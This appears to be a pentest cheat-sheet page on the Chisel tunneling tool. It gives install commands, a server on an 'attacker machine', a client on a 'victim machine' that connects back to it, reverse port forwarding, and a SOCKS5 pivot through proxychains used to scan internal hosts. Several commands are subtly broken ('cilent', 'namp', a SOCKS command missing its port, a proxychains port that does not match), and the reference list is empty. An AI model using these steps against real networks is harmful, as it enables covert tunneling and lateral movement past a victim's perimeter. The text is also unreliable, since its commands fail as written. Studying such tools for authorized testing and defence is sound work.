---
title: tool-chisel
tags: [tunneling-and-exfiltration, pivoting, type/tool, phase/lateral-movement, platform/linux, platform/container, platform/network]
---

# Tool - Chisel

## Commands

## Installation

```
# Source
go install github.com/jpillora/chisel@latest

# Docker
docker run --rm -it jpillora/chisel --help
```

### Help Menu

```
./chisel -h
```

### Run Server (Attacker Machine)

```
./chisel server -p 3333
```

### Run Client (Victim Machine)

```
./chisel32 client <server ip>:3333 5555:google.com:80
```

### Reverse Method

```
# Server
./chisel server -p 3333 --reverse

# Client
./chisel32 client <server ip>:3333 R<other machine ip>:80
```

### Socks5

```
# Server
./chisel server -p 3333 --reverse --socks5

# Client
./chisel cilent <server ip> Rsocks

# Edit the proxychains4.conf in attacker machine
sudo nano /etc/proxychains4.conf
Add -> socks5 127.0.0.1 5555 

# Scanning
proxychains4 namp -p80,21 <outer machine ip>
```

## REFERENCES

* 
* 
* 

